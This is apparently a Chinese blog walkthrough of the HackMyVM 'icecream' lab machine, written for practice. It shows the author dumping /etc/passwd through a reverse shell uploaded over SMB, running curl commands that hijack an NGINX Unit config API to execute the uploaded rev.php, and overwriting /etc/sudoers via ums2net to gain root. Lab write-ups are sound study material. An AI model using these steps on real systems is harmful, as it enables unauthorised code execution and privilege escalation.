---
{"dg-publish":true,"dg-path":"安全/靶机/hackmyvm_icecream.md","permalink":"/安全/靶机/hackmyvm_icecream/","title":"hackmyvm_icecream","tags":["blog"]}
---

# 主机发现

![Pasted image 20250201223547.png](/img/user/picture/Pasted%20image%2020250201223547.png)

主机IP
```txt
192.168.124.21
```

![Pasted image 20250201224124.png](/img/user/picture/Pasted%20image%2020250201224124.png)
开放了5个端口，后面三个不清楚是什么


![Pasted image 20250201224618.png](/img/user/picture/Pasted%20image%2020250201224618.png)


# SMB渗透

![Pasted image 20250202101753.png](/img/user/picture/Pasted%20image%2020250202101753.png)


![Pasted image 20250202102444.png](/img/user/picture/Pasted%20image%2020250202102444.png)
这个目录像是`/tmp`目录

上传反弹shell
![Pasted image 20250202102820.png](/img/user/picture/Pasted%20image%2020250202102820.png)

![Pasted image 20250202102836.png](/img/user/picture/Pasted%20image%2020250202102836.png)

```shell
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
ice:x:1000:1000:ice,,,:/home/ice:/bin/bash
unit:x:999:995:unit user:/nonexistent:/bin/false

```
# 提权-1


//后面的差不多是几乎没看懂，只能先看大佬WP复刻一下


```shell
curl -X PUT -d '{"app":{"type":"php","root":"/tmp","script":"rev.php"}}' http://192.168.124.21:9000/config/applications

curl -X PUT -d '[{"action":{"share":"/tmp/rev.php$uri","fallback":{"pass":"applications/app"}}}]' http://192.168.124.21:9000/config/routes

curl -X PUT -d '{"*:8888":{"pass":"routes"}}' http://192.168.124.21:9000/config/listeners
```

![Pasted image 20250202104533.png](/img/user/picture/Pasted%20image%2020250202104533.png)

之后再去访问
```
http://192.168.124.21:8888/rev.php
```

![Pasted image 20250202104642.png](/img/user/picture/Pasted%20image%2020250202104642.png)

```txt
HMVaneraseroflove
```


# 提权-2


![Pasted image 20250202104843.png](/img/user/picture/Pasted%20image%2020250202104843.png)

看了一下思路大概就是利用`ums2net`写入文件`/etc/sudoers`
```txt
ice ALL=(ALL) NOPASSWD: ALL
```
![Pasted image 20250202110137.png](/img/user/picture/Pasted%20image%2020250202110137.png)



```shell
echo "8080 of=/etc/sudoers" > /tmp/config
```

```shell
sudo /usr/sbin/ums2net -c /tmp/config -d
```

![Pasted image 20250202110245.png](/img/user/picture/Pasted%20image%2020250202110245.png)

![Pasted image 20250202110253.png](/img/user/picture/Pasted%20image%2020250202110253.png)


现在ice用户权限就增加了
![Pasted image 20250202110344.png](/img/user/picture/Pasted%20image%2020250202110344.png)

```shell
sudo bash
```
就有root权限了
![Pasted image 20250202111017.png](/img/user/picture/Pasted%20image%2020250202111017.png)
```txt
HMViminvisible
```






#  小结

这个靶场对我来说还是太难了，全程就是看着大佬的WP做下来的
在两次提权阶段所应用的技术都是我第一次接触
对于SMB服务我也是非常不熟悉
总之，还得练






